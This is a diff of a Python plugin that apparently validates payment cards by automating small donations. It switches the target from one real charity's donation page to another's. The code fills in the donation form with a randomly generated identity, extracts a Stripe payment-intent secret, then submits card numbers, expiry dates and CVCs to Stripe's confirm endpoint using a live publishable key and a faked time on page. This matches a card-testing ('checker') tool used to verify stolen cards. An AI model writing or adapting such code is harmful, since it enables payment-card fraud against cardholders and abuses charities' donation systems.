@@ -5,71 +5,50 @@ from mills.plugins._helpers.tools import find_between
 
 def chk_one(r,rand_user):
     
-    a = r.get('https://www.heartuk.org.uk/donate/single-donation/submit')
+    a = r.get('https://hobanz.org.nz/donate/')
     if not a: return
-
     b_data = {
-    'amount': '10',
-    'otheramount': '',
-    'title': 'Mr',
-    'title_other_value': '',
-    'firstname': rand_user['first_name'],
-    'lastname': rand_user['last_name'],
-    'country': 'United States',
-    'postcode': rand_user['zip'],
-    'address1': rand_user['street'],
-    'address2': '',
-    'town': rand_user['city'],
-    'county': rand_user['state'],
-    'telephone': rand_user['phone'],
-    'email': ['email'],
-    'contact_pref_4': '1',
-    'donation_submit': 'Next step    ',
+    'Amount': 'Other',
+    'OtherValue': '5',
+    'Schedule': 'OneOff',
+    'PaymentMethod': 'CreditCard',
+    }
+    b = r.post('https://hobanz.org.nz/donate/setamount', b_data)
+    SecurityID = find_between(b.text, 'SecurityID" value="','"')
+    if not SecurityID: return
+    c_data = {
+    'FirstName': rand_user['first_name'],
+    'Surname': rand_user['last_name'],
+    'Email': rand_user['email'],
+    'Company': '',
+    'Phone': rand_user['phone'],
+    'SecurityID': SecurityID,
     }
 
-    # b = r.post('https://hobanz.org.nz/donate/setamount', b_data)
-
-    # SecurityID = find_between(b.text, 'SecurityID" value="','"')
-
-    # if not SecurityID: return
-    # c_data = {
-    # 'FirstName': rand_user['first_name'],
-    # 'Surname': rand_user['last_name'],
-    # 'Email': rand_user['email'],
-    # 'Company': '',
-    # 'Phone': rand_user['phone'],
-    # 'SecurityID': SecurityID,
-    # }
-
-    c = r.post('https://www.heartuk.org.uk/donate/single-donation/submit', b_data)
-    stripe = find_between(c.text,'stripe.handleCardPayment(','",')
-    if not stripe: return "Token Error", "❌", 'Token'
-    return stripe
+    c = r.post('https://hobanz.org.nz/donate/CCPaymentForm/', c_data)
+    confirmCardPayment = find_between(c.text, 'stripe.confirmCardPayment("','"')
+    if not confirmCardPayment: return
+    return confirmCardPayment
 
 
-def chk_two(r, sec, cc, mes,ano, cvv,rand_user):
-    pi = sec.strip().replace('"','')
-    pi_sec = pi.split('_sec')[0]
+def chk_two(r, sec, cc, mes,ano, cvv):
+    req_sec = sec.split('_secret')[0]
     payload_e = {
-    'payment_method_data[type]': 'card',
-    'payment_method_data[billing_details][name]': rand_user['name'],
-    'payment_method_data[billing_details][email]': rand_user['email'],
-    'payment_method_data[card][number]': cc,
-    'payment_method_data[card][cvc]': cvv,
-    'payment_method_data[card][exp_month]': mes,
-    'payment_method_data[card][exp_year]': ano,
-    'payment_method_data[guid]': 'NA',
-    'payment_method_data[muid]': 'NA',
-    'payment_method_data[sid]': 'NA',
-    'payment_method_data[payment_user_agent]': 'stripe.js/653c2107b; stripe-js-v3/653c2107b',
-    'payment_method_data[time_on_page]': '55245',
-    'expected_payment_method_type': 'card',
-    'use_stripe_sdk': 'true',
-    'key': 'pk_live_b0Wwz4q7JcwFqfqBjmSkndzv',
-    'client_secret': pi,
-    }
+'payment_method_data[type]': 'card',
+'payment_method_data[card][number]': cc,
+'payment_method_data[card][cvc]': cvv,
+'payment_method_data[card][exp_month]': mes,
+'payment_method_data[card][exp_year]': ano,
+'payment_method_data[pasted_fields]': 'number',
+'payment_method_data[payment_user_agent]': 'stripe.js/394a74bde; stripe-js-v3/394a74bde',
+'payment_method_data[time_on_page]': '52031',
+'expected_payment_method_type': 'card',
+'use_stripe_sdk': 'true',
+'key': 'pk_live_51HNUX1B7zDC0drK8sRj8haOEOxk8bhuI3ymfE9c51igSbpd9DobzAVWlQXReI6opqlGTKaIuo37tphcBq0HYHU19007vBkUgLF',
+'client_secret': sec,
+}
 
-    e = requests.post(f'https://api.stripe.com/v1/payment_intents/{pi_sec}/confirm', data = payload_e)
+    e = requests.post(f'https://api.stripe.com/v1/payment_intents/{req_sec}/confirm', data = payload_e)
     return e.json()
 
 
